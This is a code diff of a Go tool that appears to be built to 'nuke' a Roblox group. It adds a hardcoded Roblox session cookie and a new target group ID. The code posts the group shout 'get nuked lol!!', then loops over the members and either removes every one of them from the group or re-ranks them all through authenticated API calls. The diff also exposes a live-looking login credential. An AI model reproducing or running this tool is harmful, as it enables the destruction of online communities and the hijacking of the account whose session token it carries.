@@ -21,10 +21,10 @@ import (
 
 var (
 	client  http.Client
-	cookie  = ""
-	groupID = "7811440"
-	From    = "devils"
-	To      = "estupidos"
+	cookie  = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_71D211D7C582E54D5FC155F1022E2994480731256020508D7D63CE8CE99EAA5218066633A0AC0008A847C4194EB65C8F6F465283168AE71286F8F4CE98289B559170B0D3FCCD5FCEBFAD0532C54257F63B417BE823E045C023D647399D45D8A6EA41F60ACBA31780E688C77306CD8D8A69B8880C9AEF25782FB70C393BF90D21CC1BACE2F2C3DE63015C15A809A436ECCDCE5D8F85CF321D7CFAC5906F9D641EA5A28C9705F169CBA37D28A0DB8B22D3493E329A11CB8AF5397749091562B910FF9A1E3FE9ACDD517F0CB1EABB67AD8E93856E18DEB282D2D56BE168B5D4CB9287E45983711F2829EB68A14D6477F51E6EA652A89479AC41E5541AA54630501E3C1095C660021CB74F1C88236D2915DF88B27016BEE4A5A5C41DC984895A286850E77BF393764C77F030DEB6EB741F15ECDF1E4342BF78519336B1A29B3A4D3CE91E147A"
+	groupID = "8256997"
+	From    = "Admin"
+	To      = "Admin"
 )
 
 const CookieRequired = 4
@@ -53,18 +53,29 @@ func main() {
 
 	input := bufio.NewScanner(os.Stdin)
 	input.Scan()
-	data := GetMembers()
-	if len(data.Data) == 0 {
-		fmt.Println("No members found")
-		return
+
+	req := FormatRequest(http.MethodPatch, "https://groups.roblox.com/v1/groups/"+groupID+"/status", CookieRequired, []byte(`{"message":"get nuked lol!!"}`))
+	if req == nil {
+		fmt.Println("Failed to post a shout, maybe theres captcha? Continuing...")
+	}
+	Check := func(data Users) {
+		if len(data.Data) == 0 {
+			fmt.Println("Finished")
+			time.Sleep(time.Second * 3)
+			os.Exit(0)
+		}
 	}
 	switch input.Text() {
 	case "2":
 		for {
+			data := GetMembers()
+			Check(data)
 			Blacklist(data)
 		}
 	case "1":
 		for {
+			data := GetMembers()
+			Check(data)
 			RankToRank(data)
 		}
 	}
@@ -72,6 +83,7 @@ func main() {
 func RankToRank(data Users) {
 	go func() {
 		for i, v := range data.Data {
+
 			for _, b := range SortRoles().Roles {
 				if b.Name == To {
 					dataBytes := []byte(`{"roleId":"` + strconv.Itoa(b.ID) + `"}`)
@@ -81,7 +93,6 @@ func RankToRank(data Users) {
 					}
 				}
 			}
-
 		}
 	}()
 
@@ -181,6 +192,7 @@ var helpStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("#626262")).Render
 func Blacklist(users Users) {
 	go func() {
 		for i, v := range users.Data {
+
 			req := FormatRequest(http.MethodDelete, "https://groups.roblox.com/v1/groups/"+groupID+"/users/"+strconv.Itoa(v.UserID), CookieRequired, nil)
 			if req != nil {
 				currentPercent = float64(i+1) / 100
